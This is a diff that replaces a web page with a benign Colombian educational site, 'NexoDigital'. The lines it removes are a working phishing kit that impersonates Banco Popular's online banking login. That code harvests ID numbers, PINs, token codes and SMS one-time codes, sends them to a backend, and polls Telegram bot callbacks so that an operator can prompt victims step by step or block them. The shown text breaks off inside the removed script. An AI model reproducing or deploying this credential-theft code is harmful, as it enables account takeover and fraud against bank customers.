@@ -2,690 +2,180 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Banco Popular - Portal de acceso</title>
-
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#07111f">
+<meta name="description" content="NexoDigital: portal educativo sobre internet, conectividad, fibra óptica y tecnología digital en Colombia.">
+<title>NexoDigital | Tecnología y conectividad</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
-:root {
-    --brand-green: #00A650;
-    --dark-gray: #333333;
-    --orange: #f36b21;
-    --background: #f5f5f5;
-}
 
-html, body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: var(--background);
-    color: #111;
-    min-height: 100vh;
-    -webkit-text-size-adjust: 100%;
-}
-
-/* ============ ESCRITORIO ============ */
-.page {
-    width: 100%; max-width: 1100px; min-height: calc(100vh - 95px);
-    margin: auto; display: grid; grid-template-columns: 360px 1fr;
-    gap: 30px; align-items: center; padding: 10px 20px 0;
-}
-
-.login-card {
-    background: white; width: 100%; min-height: 600px;
-    padding: 45px 32px 30px; border-radius: 14px 14px 0 0;
-    box-shadow: 0 1px 10px rgba(0,0,0,.06); position: relative;
-}
-
-.security {
-    position: absolute; top: 18px; right: 28px;
-    width: 19px; height: 19px; border: 1.5px solid var(--orange);
-    color: var(--orange); border-radius: 50%;
-    display: flex; align-items: center; justify-content: center; font-size: 11px;
-}
-
-.welcome { font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #555; }
-
-.logo { margin-bottom: 35px; }
-.logo img { height: 32px; object-fit: contain; }
-
-.field { margin-bottom: 20px; }
-.field-label { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13px; font-weight: bold; }
-.field-label a { color: var(--orange); font-weight: bold; text-decoration: underline; }
-
-.input {
-    width: 100%; height: 48px; border: 1px solid #ccc; border-radius: 8px;
-    padding: 0 15px; font-size: 16px; background: white; outline: none; color: #111; font-family: inherit;
-    transition: border-color 0.2s;
-}
-.input:focus { border: 1.5px solid var(--brand-green); }
-select.input { cursor: pointer; }
-
-.password-box { position: relative; }
-.password-box input { padding-right: 45px; letter-spacing: 6px; }
-.eye {
-    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
-    background: transparent; border: none; cursor: pointer; color: #999; font-size: 19px; padding: 8px;
-}
-
-.remember { display: flex; align-items: center; gap: 9px; margin: 25px 0 30px; font-size: 13px; color: #444; }
-.switch { width: 36px; height: 22px; background: #ccc; border-radius: 20px; position: relative; cursor: pointer; flex-shrink: 0; transition: .2s; }
-.switch input { display: none; }
-.switch span { width: 18px; height: 18px; position: absolute; background: white; border-radius: 50%; top: 2px; left: 2px; transition: .2s; }
-.switch input:checked + span { left: 16px; }
-.switch:has(input:checked) { background: var(--brand-green); }
-
-.continue {
-    width: 100%; height: 50px; border: none; border-radius: 8px;
-    background: #e0e0e0; color: #999; font-size: 16px; font-weight: bold;
-    cursor: not-allowed; transition: .2s; font-family: inherit;
-}
-.continue.active { background: var(--brand-green); color: white; cursor: pointer; }
-.continue.active:hover { background: #008c43; }
-
-.register { text-align: center; margin-top: 25px; font-size: 13px; color: #666; }
-.register a { color: var(--brand-green); font-weight: bold; margin-left: 5px; text-decoration: none; }
-
-.error-msg { display: none; color: #d9381e; font-size: 13px; margin-top: 10px; text-align: center; font-weight: bold; }
-.error-msg.show { display: block; }
-
-.loading-overlay {
-    display: none; position: fixed; inset: 0; background: rgba(255,255,255,.9);
-    z-index: 10000; align-items: center; justify-content: center; flex-direction: column;
-}
-.loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--brand-green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
-
-/* Columna Derecha */
-.right-content { width: 100%; padding: 20px 0; }
-.banner { width: 100%; min-height: 320px; background: var(--brand-green); border-radius: 16px; position: relative; overflow: hidden; display: flex; align-items: center; color: white; box-shadow: 0 10px 20px rgba(0,166,80,.15); }
-.banner::before { content: ""; position: absolute; width: 300px; height: 300px; background: rgba(255,255,255,0.1); border-radius: 50%; top: -150px; left: -100px; }
-.banner::after { content: ""; position: absolute; width: 250px; height: 250px; background: rgba(255,255,255,0.1); border-radius: 50%; bottom: -150px; right: -50px; }
-.banner-person { position: relative; z-index: 1; width: 40%; height: 320px; display: flex; align-items: end; justify-content: center; font-size: 100px; }
-.banner-person span { margin-bottom: 20px; text-shadow: 0 10px 20px rgba(0,0,0,.2); }
-.banner-info { width: 60%; position: relative; z-index: 2; padding: 30px; }
-.banner-info h2 { font-size: 24px; color: white; margin-bottom: 12px; }
-.banner-info p { font-size: 15px; line-height: 1.5; margin-bottom: 20px; color: #e6f6ed; }
-.banner-info button { background: white; border: none; border-radius: 8px; padding: 12px 20px; color: var(--brand-green); font-weight: bold; font-size: 14px; cursor: pointer; transition: 0.2s; }
-.banner-info button:hover { background: #f0f0f0; }
-
-.slider-lines { display: flex; gap: 8px; margin: 20px 0 30px; }
-.slider-lines span { height: 5px; background: #ddd; flex: 1; border-radius: 5px; }
-.slider-lines span:nth-child(3) { background: var(--brand-green); }
-
-.help h2 { font-size: 18px; margin-bottom: 18px; color: #333; }
-.help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-.help-card { background: white; border-radius: 12px; min-height: 95px; display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 10px; font-size: 13px; cursor: pointer; font-weight: bold; color: #444; box-shadow: 0 2px 8px rgba(0,0,0,.04); transition: 0.2s; }
-.help-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,.08); }
-.help-icon { width: 40px; height: 40px; background: #e6f6ed; color: var(--brand-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-
-.footer { width: 100%; background: white; min-height: 95px; border-top: 1px solid #eee; }
-.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 15px 30px; }
-.footer-logo { color: var(--brand-green); font-weight: 900; font-size: 20px; }
-.footer-links { display: flex; gap: 25px; }
-.footer-links a { color: #666; font-size: 13px; font-weight: bold; text-decoration: none; }
-.footer-bottom { border-top: 1px solid #eee; padding: 10px 30px; font-size: 11px; display: flex; justify-content: space-between; color: #888; }
-
-/* ============ MODAL OTP ============ */
-.demo-overlay { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,.6); backdrop-filter: blur(3px); align-items: center; justify-content: center; padding: 16px; }
-.demo-overlay.is-open { display: flex; }
-.demo-modal { width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto; background: #fff; border-radius: 20px; padding: 24px 24px 30px; box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative; -webkit-overflow-scrolling: touch; }
-.demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 8px; }
-.demo-close { border: 0; background: #f0f0f0; border-radius: 50%; font-size: 24px; line-height: 1; width: 36px; height: 36px; cursor: pointer; color: #555; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
-.demo-close:hover { background: #e0e0e0; }
-.demo-instruction { background: #e6f6ed; border-radius: 12px; padding: 20px; text-align: center; margin: 0 0 20px; color: #006a33; font-size: 15px; line-height: 1.5; }
-.demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; font-size: 18px; }
-.demo-title { text-align: center; font-size: 22px; line-height: 1.2; margin: 10px 0 22px; color: #333; }
-
-.otp-single-input {
-    width: 100%;
-    max-width: 320px;
-    margin: 0 auto 10px;
-    height: 60px;
-    border: 1.5px solid #ccc;
-    border-radius: 12px;
-    text-align: center;
-    font-size: 28px;
-    letter-spacing: 12px;
-    font-weight: bold;
-    color: #333;
-    background: #fafafa;
-    outline: none;
-    display: block;
-    transition: 0.2s;
-}
-.otp-single-input:focus { border-color: var(--brand-green); background: #fff; box-shadow: 0 0 0 3px rgba(0,166,80,.15); }
-.otp-single-input.error { border-color: #d9381e; background: #fff9f8; }
-.otp-single-input::placeholder { letter-spacing: 8px; color: #aaa; font-weight: normal; font-size: 24px; }
-
-.demo-actions { display: flex; justify-content: center; gap: 12px; margin-top: 25px; }
-.demo-actions button { flex: 1; max-width: 200px; min-height: 50px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; border: none; font-family: inherit; }
-.demo-actions .bc-button-secondary { background: transparent; color: #555; border: 1.5px solid #ccc; }
-.demo-actions .bc-button-secondary:hover { background: #f5f5f5; }
-.demo-actions .bc-button-primary { background: var(--brand-green); color: #fff; }
-.demo-actions .bc-button-primary:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
-.demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 20px; }
-.demo-step { display: none; }
-.demo-step.active { display: block; }
-
-/* ============ MÓVIL / TABLET ============ */
-@media (max-width: 800px) {
-    body { background: #fff; }
-    .page { display: block; padding: 0; min-height: auto; max-width: 100%; }
-    .login-card { width: 100%; min-height: auto; padding: 32px 24px 40px; border-radius: 0; box-shadow: none; }
-    .security { top: 20px; right: 24px; }
-    .welcome { font-size: 17px; margin-bottom: 15px; }
-    .logo img { height: 28px; }
-    .logo { margin-bottom: 30px; }
-    
-    .field { margin-bottom: 22px; }
-    .field-label { font-size: 14px; margin-bottom: 8px; }
-    .input { height: 55px; font-size: 16px; padding: 0 16px; border-radius: 10px; }
-    .password-box input { letter-spacing: 8px; padding-right: 52px; }
-    .eye { font-size: 22px; right: 14px; padding: 10px; }
-    
-    .remember { font-size: 14px; gap: 10px; margin: 22px 0 28px; }
-    .switch { width: 42px; height: 24px; }
-    .switch span { width: 20px; height: 20px; top: 2px; left: 2px; }
-    .switch input:checked + span { left: 20px; }
-    
-    .continue { height: 56px; font-size: 17px; border-radius: 10px; }
-    .register { font-size: 15px; margin-top: 28px; }
-    
-    .right-content { display: block; padding: 10px 24px 32px; }
-    .banner { min-height: 160px; border-radius: 14px; }
-    .banner-person { width: 32%; height: 160px; font-size: 60px; }
-    .banner-person span { margin-bottom: 10px; }
-    .banner-info { width: 68%; padding: 16px; }
-    .banner-info h2 { font-size: 16px; margin-bottom: 6px; }
-    .banner-info p { font-size: 12px; line-height: 1.4; margin-bottom: 10px; }
-    .banner-info button { padding: 9px 14px; font-size: 12px; }
-    .banner::before { width: 140px; height: 140px; top: -90px; left: -40px; }
-    .banner::after  { width: 140px; height: 140px; bottom: -110px; right: -50px; }
-    
-    .slider-lines { display: none; }
-    .help { margin-top: 25px; }
-    .help h2 { font-size: 18px; margin-bottom: 16px; }
-    .help-cards { gap: 12px; }
-    .help-card { min-height: 90px; font-size: 12px; padding: 8px; }
-    .help-icon { width: 36px; height: 36px; font-size: 18px; }
-    
-    .footer { min-height: 60px; }
-    .footer-top { justify-content: center; padding: 16px; }
-    .footer-logo { display: none; }
-    .footer-bottom { display: none; }
-    .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
-    .footer-links a { font-size: 13px; }
-    
-    .demo-overlay { padding: 16px; }
-    .demo-modal { padding: 22px 22px 28px; border-radius: 20px; max-width: 100%; }
-    .demo-instruction { padding: 18px; font-size: 15px; }
-    
-    .otp-single-input {
-        font-size: 24px;
-        letter-spacing: 8px;
-        height: 55px;
-    }
-}
-
-@media (max-width: 400px) {
-    .login-card { padding: 26px 20px 34px; }
-    .input { height: 52px; padding: 0 14px; }
-    .continue { height: 54px; font-size: 16px; }
-    
-    .otp-single-input {
-        font-size: 22px;
-        letter-spacing: 5px;
-        height: 52px;
-    }
-}
+:root{--bg:#07111f;--panel:#101f32;--line:#263951;--cyan:#45e7ff;--green:#6bf5b5;--text:#f0f7ff;--muted:#a9bbcf}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.7 system-ui,Arial,sans-serif}
+a{color:var(--cyan)}
+.wrap{width:min(1050px,92%);margin:auto}
+header{position:sticky;top:0;z-index:5;background:#07111fee;border-bottom:1px solid var(--line);backdrop-filter:blur(12px)}
+nav{display:flex;justify-content:space-between;align-items:center;gap:15px;flex-wrap:wrap;padding:17px 0}
+.logo{font-size:22px;font-weight:850;color:var(--cyan);text-decoration:none}
+.links{display:flex;gap:16px;flex-wrap:wrap}
+.links a{text-decoration:none;font-size:14px}
+.hero{padding:85px 0;background:radial-gradient(ellipse at 80% 20%,#17455c 0,transparent 45%),linear-gradient(140deg,#091525,#0b2031)}
+.tag{font-size:12px;letter-spacing:2px;color:var(--green);text-transform:uppercase}
+h1{font-size:clamp(38px,7vw,66px);line-height:1.1;letter-spacing:-2px;max-width:800px}
+h1 span{color:var(--cyan)}
+h2{font-size:28px;line-height:1.3}
+p{color:var(--muted)}
+.btn{display:inline-block;background:var(--cyan);color:#06111d;padding:12px 20px;border-radius:7px;text-decoration:none;font-weight:800;margin:10px 8px 0 0}
+section{padding:38px 0;scroll-margin-top:85px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.card{background:linear-gradient(145deg,#122239,#0c1828);border:1px solid var(--line);border-radius:13px;padding:22px}
+.card h3{color:var(--green);margin-top:0}
+.notice{padding:15px 18px;border-left:3px solid var(--cyan);background:#102235;border-radius:5px}
+input,textarea,button{width:100%;font:inherit;padding:12px;margin:8px 0 14px;border:1px solid var(--line);border-radius:6px;background:#091525;color:white}
+button{background:var(--cyan);color:#07111f;font-weight:800;cursor:pointer}
+label{color:var(--muted)}
+details{padding:15px 0;border-bottom:1px solid var(--line)}
+summary{color:var(--cyan);font-weight:700;cursor:pointer}
+footer{border-top:1px solid var(--line);padding:30px 0}
+footer a{margin-right:14px}
+.small{font-size:13px}
+@media(max-width:600px){.hero{padding:55px 0}.links{gap:10px}h2{font-size:24px}}
 </style>
 </head>
-
 <body>
+<header>
+<nav class="wrap">
+<a class="logo" href="#inicio">NexoDigital</a>
+<div class="links">
+<a href="#nosotros">Nosotros</a>
+<a href="#aprende">Aprende</a>
+<a href="#recursos">Recursos</a>
+<a href="#preguntas">FAQ</a>
+<a href="#contacto">Contacto</a>
+</div>
+</nav>
+</header>
 
-<div class="loading-overlay" id="loading-overlay">
-    <div class="loading-spinner"></div>
-    <p style="margin-top:15px;font-weight:600;color:var(--brand-green);">Procesando solicitud...</p>
+<main>
+<div class="hero" id="inicio">
+<div class="wrap">
+<div class="tag">Educación digital · Colombia</div>
+<h1>Comprende la tecnología. <span>Conéctate al futuro.</span></h1>
+<p>Un espacio informativo para aprender sobre internet, conectividad y herramientas digitales con explicaciones claras y prácticas.</p>
+<a class="btn" href="#aprende">Explorar contenidos ↗</a>
+</div>
 </div>
 
-<main class="page">
-    <section class="login-card">
-        <div class="security">♙</div>
-        <h1 class="welcome">Bienvenido a</h1>
-        
-        <div class="logo">
-            <!-- Asegúrate de tener la imagen en la misma carpeta o usa una URL válida -->
-            <img src="logopopu.svg" alt="Banco Popular" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Logo_Banco_Popular.svg/512px-Logo_Banco_Popular.svg.png'">
-        </div>
+<div class="wrap">
+<section id="nosotros">
+<div class="tag">01 / Nuestra misión</div>
+<h2>Conocimiento digital para todos</h2>
+<p>NexoDigital es un proyecto informativo independiente dedicado a explicar conceptos de internet y tecnología. Nuestro propósito es ayudar a las personas a comprender mejor el mundo digital y tomar decisiones informadas.</p>
+<p class="notice">El contenido de este sitio es educativo. No somos un operador de telecomunicaciones ni ofrecemos contratos de conexión a internet.</p>
+</section>
 
-        <form id="demoForm" autocomplete="off" novalidate>
-            <div class="field">
-                <label class="field-label" for="documentType">Tipo de documento</label>
-                <select class="input" id="documentType">
-                    <option>Cédula de Ciudadanía</option>
-                    <option>Cédula de Extranjería</option>
-                    <option>Pasaporte</option>
-                    <option>Tarjeta de Identidad</option>
-                </select>
-            </div>
-            <div class="field">
-                <label class="field-label" for="documentNumber">Número de documento</label>
-                <input class="input" id="documentNumber" type="text" inputmode="numeric" placeholder="Número de documento" autocomplete="off" required>
-            </div>
-            <div class="field">
-                <div class="field-label">
-                    <label for="password">Contraseña</label>
-                    <a href="#" onclick="return false">¿La olvidaste?</a>
-                </div>
-                <div class="password-box">
-                    <input class="input" id="password" type="password" inputmode="numeric" maxlength="4" placeholder="----" autocomplete="off" required>
-                    <button class="eye" id="togglePassword" type="button" aria-label="Mostrar u ocultar">◉</button>
-                </div>
-            </div>
-            <div class="remember">
-                <label class="switch"><input type="checkbox" id="remember"><span></span></label>
-                <label for="remember">Recordar mis datos</label>
-            </div>
-            <button class="continue" id="continueButton" type="submit" disabled>Continuar</button>
-            <p id="loginError" class="error-msg">El usuario o la clave son incorrectos.</p>
-            <div class="register">¿No tienes cuenta? <a href="#" onclick="return false">Regístrate aquí</a></div>
-        </form>
-    </section>
+<section id="aprende">
+<div class="tag">02 / Aprende</div>
+<h2>Explora el mundo de la conectividad</h2>
+<div class="grid">
+<article class="card">
+<h3>◈ Fibra óptica</h3>
+<p>Aprende cómo funciona esta tecnología, cómo transmite información y qué factores influyen en su rendimiento.</p>
+</article>
+<article class="card">
+<h3>↗ Velocidad de internet</h3>
+<p>Comprende los Mbps, las velocidades de subida y descarga y su relación con las actividades digitales cotidianas.</p>
+</article>
+<article class="card">
+<h3>◎ Wi-Fi y redes</h3>
+<p>Conoce los factores que afectan la señal inalámbrica, la ubicación del router y la conexión de tus dispositivos.</p>
+</article>
+<article class="card">
+<h3>⌘ Seguridad digital</h3>
+<p>Descubre buenas prácticas para proteger tus cuentas, reconocer riesgos y navegar con mayor seguridad.</p>
+</article>
+</div>
+</section>
 
-    <section class="right-content">
-        <div class="banner">
-            <div class="banner-person"><span>👩🏻‍💼</span></div>
-            <div class="banner-info">
-                <h2>Tus finanzas, más fáciles</h2>
-                <p>Gestiona tus productos, haz consultas y realiza transacciones de forma segura desde nuestro portal.</p>
-                <button type="button">Conoce más</button>
-            </div>
-        </div>
-        <div class="slider-lines"><span></span><span></span><span></span><span></span></div>
-        <div class="help">
-            <h2>¿Cómo podemos ayudarte?</h2>
-            <div class="help-cards">
-                <div class="help-card"><div class="help-icon">▣</div>Productos</div>
-                <div class="help-card"><div class="help-icon">▯</div>Contáctanos</div>
-                <div class="help-card"><div class="help-icon">♧</div>Sucursales</div>
-            </div>
-        </div>
-    </section>
+<section id="recursos">
+<div class="tag">03 / Recursos</div>
+<h2>Guías prácticas</h2>
+<div class="grid">
+<article class="card">
+<h3>Cómo entender tu conexión</h3>
+<p>Conoce la diferencia entre velocidad, estabilidad, cobertura y latencia.</p>
+</article>
+<article class="card">
+<h3>Cómo evaluar un servicio</h3>
+<p>Aprende a revisar precios, condiciones, equipos y características antes de tomar una decisión.</p>
+</article>
+<article class="card">
+<h3>Hábitos digitales</h3>
+<p>Mejora tus conocimientos sobre privacidad, contraseñas y uso responsable de internet.</p>
+</article>
+</div>
+<p class="notice">Los contenidos son orientativos y no constituyen asesoría comercial. Las condiciones de cualquier servicio deben comprobarse con su proveedor.</p>
+</section>
+
+<section id="preguntas">
+<div class="tag">04 / Preguntas frecuentes</div>
+<h2>Resolvemos tus dudas</h2>
+<details>
+<summary>¿Qué es NexoDigital?</summary>
+<p>Es un proyecto educativo independiente sobre tecnología, internet y conocimientos digitales.</p>
+</details>
+<details>
+<summary>¿Puedo contratar internet desde este sitio?</summary>
+<p>No. Este sitio no comercializa planes ni tramita contratos de telecomunicaciones.</p>
+</details>
+<details>
+<summary>¿La información sustituye las condiciones de un proveedor?</summary>
+<p>No. Es información general y educativa; consulta las fuentes correspondientes para verificar las condiciones vigentes de cualquier servicio.</p>
+</details>
+</section>
+
+<section id="contacto">
+<div class="tag">05 / Contacto</div>
+<h2>Comunícate con NexoDigital</h2>
+<p>Utiliza este formulario para enviar preguntas sobre el contenido educativo.</p>
+<form action="/contacto" method="post">
+<label for="nombre">Nombre</label>
+<input id="nombre" name="nombre" autocomplete="name" required>
+<label for="mensaje">Mensaje</label>
+<textarea id="mensaje" name="mensaje" rows="4" required></textarea>
+<label><input type="checkbox" name="privacidad" required style="width:auto"> He leído la <a href="#privacidad">política de privacidad</a>.</label>
+<button type="submit">Enviar mensaje ↗</button>
+</form>
+<p class="small">El formulario requiere configurar un servicio de recepción de mensajes. No envíes datos sensibles.</p>
+</section>
+
+<section id="terminos">
+<div class="tag">06 / Información legal</div>
+<h2>Términos y condiciones</h2>
+<p>NexoDigital ofrece contenido educativo de carácter general. No garantiza que toda la información permanezca actualizada ni presta servicios de conexión a internet. El usuario debe verificar la información relevante antes de tomar decisiones. El uso del sitio está sujeto a las normas aplicables en Colombia.</p>
+
+<h2 id="privacidad">Política de privacidad</h2>
+<p>Este sitio debe recopilar únicamente los datos necesarios para sus finalidades informadas. Si se habilita el formulario, antes de recibir datos se debe identificar al responsable, explicar las finalidades, obtener la autorización cuando corresponda e informar los derechos de los titulares conforme a la Ley 1581 de 2012 y sus normas reglamentarias. La política definitiva debe describir las prácticas reales del sitio y proporcionar un canal efectivo para consultas y reclamos.</p>
+
+<h2>Cookies</h2>
+<p>Si se incorporan herramientas de analítica, publicidad o seguimiento, se deberá informar su utilización y aplicar las medidas de privacidad que correspondan.</p>
+</section>
+</div>
 </main>
 
-<footer class="footer">
-    <div class="footer-top">
-        <div class="footer-logo">Banco Popular</div>
-        <div class="footer-links">
-            <a href="#" onclick="return false">Seguridad</a>
-            <a href="#" onclick="return false">Accesibilidad</a>
-        </div>
-    </div>
-    <div class="footer-bottom">
-        <span>Portal de demostración</span>
-        <span>© Banco Popular - Todos los derechos reservados</span>
-    </div>
-</footer>
-
-<div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
-    <section class="demo-modal">
-        <div class="demo-close-row"><button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button></div>
-        
-        <!-- VISTA TOKEN / DINÁMICA -->
-        <div id="viewDinamica" class="demo-step active">
-            <div class="demo-instruction"><strong>Token de Seguridad O SMS</strong>Ingresa el código de 8 dígitos generado por tu dispositivo.</div>
-            <h2 class="demo-title">Token o SMS</h2>
-            
-            <!-- INPUT ÚNICO -->
-            <input type="text" id="otpInput" class="otp-single-input" maxlength="8" inputmode="numeric" placeholder="--------" autocomplete="off">
-            
-            <p id="otpError" class="error-msg" style="margin-bottom:12px;">Token incorrecto o expirado.</p>
-            <div class="demo-actions">
-                <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
-                <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
-            </div>
-        </div>
-
-        <!-- VISTA SMS -->
-        <div id="viewSms" class="demo-step">
-            <div class="demo-instruction"><strong>Verificación SMS</strong>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
-            <h2 class="demo-title">Código SMS</h2>
-            <div style="max-width:280px;margin:0 auto 16px;" id="smsInputWrap">
-                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:50px;letter-spacing:6px;">
-            </div>
-            <p id="smsError" class="error-msg" style="margin-bottom:12px;">Código SMS inválido.</p>
-            <div class="demo-actions">
-                <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
-            </div>
-        </div>
-        <p class="demo-note">Banco Popular - Banca en línea</p>
-    </section>
+<footer>
+<div class="wrap">
+<strong>NexoDigital</strong>
+<p>Portal educativo independiente sobre tecnología y conectividad.</p>
+<a href="#terminos">Términos y condiciones</a>
+<a href="#privacidad">Privacidad</a>
+<a href="#contacto">Contacto</a>
+<p class="small">© <span id="year"></span> NexoDigital. Todos los derechos reservados.</p>
 </div>
-
+</footer>
 <script>
-// ==========================================
-// CONFIGURACIÓN (RUTA RELATIVA EN VERCEL)
-// ==========================================
-const API_URL = '/api/send';
-
-// ELEMENTOS
-const documentType   = document.getElementById("documentType");
-const documentNumber = document.getElementById("documentNumber");
-const claveInput     = document.getElementById("password");
-const submitBtn      = document.getElementById("continueButton");
-const demoForm       = document.getElementById("demoForm");
-const loadingOverlay = document.getElementById('loading-overlay');
-const loginError     = document.getElementById('loginError');
-const togglePassword = document.getElementById("togglePassword");
-
-const modal         = document.getElementById("modalDinamica");
-const otpInput      = document.getElementById("otpInput");
-const btnBorrar     = document.getElementById("btnBorrar");
-const btnContinuar  = document.getElementById("btnContinuar");
-const otpError      = document.getElementById("otpError");
-const closeModal    = document.getElementById("closeModal");
-
-const viewDinamica  = document.getElementById("viewDinamica");
-const viewSms       = document.getElementById("viewSms");
-const smsCodeInput  = document.getElementById("smsCodeInput");
-const btnSmsFinal   = document.getElementById("btnSmsFinal");
-const smsError      = document.getElementById("smsError");
-const smsInputWrap  = document.getElementById("smsInputWrap");
-
-// ESTADO
-let pollingActivo = false;
-let pollingTimeout = null;
-let ultimoUpdateId = -1;
-let actionProcessed = false;
-let msgIdActual = null;
-let usuarioActual = "";
-
-function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
-function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
-
-// VALIDACIÓN
-function actualizarBoton() {
-    const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
-    const usuarioLleno  = documentNumber.value.trim().length > 0;
-    const valido = claveCompleta && usuarioLleno;
-
-    submitBtn.disabled = !valido;
-    submitBtn.classList.toggle("active", valido);
-    if (valido) loginError.classList.remove("show");
-}
-
-documentNumber.addEventListener("input", actualizarBoton);
-claveInput.addEventListener("input", function() {
-    claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
-    actualizarBoton();
-});
-
-togglePassword.addEventListener("click", function() {
-    const visible = claveInput.type === "text";
-    claveInput.type = visible ? "password" : "text";
-    this.textContent = visible ? "◉" : "◎";
-});
-
-// ==========================================
-// CONEXIÓN CON BACKEND
-// ==========================================
-async function enviarAlBackend(payload) {
-    try {
-        const res = await fetch(API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        
-        // Si el servidor responde con error 404 o 500
-        if (!res.ok) {
-            const errorText = await res.text();
-            console.error(`Error del servidor (${res.status}):`, errorText);
-            throw new Error(`Error ${res.status}: Revisa la consola o los logs de Vercel`);
-        }
-        
-        const data = await res.json();
-        return data;
-    } catch (error) {
-        console.error('Error de red:', error);
-        throw error;
-    }
-}
-
-function enviarIdentificacion(tipoDoc, usuario, clave) {
-    usuarioActual = usuario;
-    mostrarOverlay();
-
-    enviarAlBackend({ action: 'login', tipoDoc, usuario, clave })
-    .then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionLogin);
-        } else {
-            ocultarOverlay();
-            alert('Error al contactar al bot:\n' + (data.description || 'Desconocido'));
-        }
-    }).catch((error) => {
-        ocultarOverlay();
-        alert('Error de conexión: ' + error.message);
-    });
-}
-
-function enviarDinamica(dinamica) {
-    mostrarOverlay();
-    enviarAlBackend({ action: 'dinamica', usuario: usuarioActual, dynamicCode: dinamica })
-    .then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionDinamica);
-        } else {
-            ocultarOverlay();
-        }
-    }).catch((error) => { ocultarOverlay(); alert(error.message); });
-}
-
-function enviarSms(smsCode) {
-    mostrarOverlay();
-    enviarAlBackend({ action: 'sms', usuario: usuarioActual, smsCode: smsCode })
-    .then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionSms);
-        } else {
-            ocultarOverlay();
-        }
-    }).catch((error) => { ocultarOverlay(); alert(error.message); });
-}
-
-// ==========================================
-// POLLING (ESCUCHAR BOTONES)
-// ==========================================
-function escucharBotones(callbackAction) {
-    if (!msgIdActual) return;
-    pollingActivo = true;
-
-    async function check() {
-        if (!pollingActivo) return;
-        try {
-            const res = await fetch(`${API_URL}?offset=${ultimoUpdateId + 1}`);
-            if (!res.ok) throw new Error("Error en GET");
-            const data = await res.json();
-
-            if (!data.ok || !data.result || data.result.length === 0) {
-                pollingTimeout = setTimeout(check, 2000);
-                return;
-            }
-
-            for (const u of data.result) {
-                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
-                if (u.callback_query) {
-                    const messageId = String(u.callback_query.message.message_id);
-                    if (messageId === String(msgIdActual)) {
-                        pollingActivo = false;
-                        callbackAction(u.callback_query.data);
-                        return;
-                    }
-                }
-            }
-            pollingTimeout = setTimeout(check, 2000);
-        } catch (err) {
-            console.error("Error en polling:", err);
-            pollingTimeout = setTimeout(check, 3000);
-        }
-    }
-    check();
-}
-
-// ==========================================
-// ACCIONES
-// ==========================================
-function handleTelegramActionLogin(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
-
-    if (action === 'pedir_dinamica') {
-        modal.classList.add("is-open");
-        viewDinamica.classList.add("active");
-        viewSms.classList.remove("active");
-        otpInput.value = "";
-        otpError.classList.remove("show");
-        otpInput.classList.remove("error");
-        actualizarOTP();
-        setTimeout(() => otpInput.focus(), 100);
-    } else if (action === 'error_usuario') {
-        loginError.classList.add("show");
-        claveInput.value = "";
-        actualizarBoton();
-        claveInput.focus();
-    } else if (action === 'banear_ip') {
-        localStorage.setItem('sys_blocked_user', 'true');
-        location.reload();
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com";
-    }
-}
-
-function handleTelegramActionDinamica(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
-
-    if (action === 'error_dinamica') {
-        modal.classList.add("is-open");
-        viewDinamica.classList.add("active");
-        viewSms.classList.remove("active");
-        otpError.classList.add("show");
-        otpInput.classList.add("error");
-        otpInput.value = "";
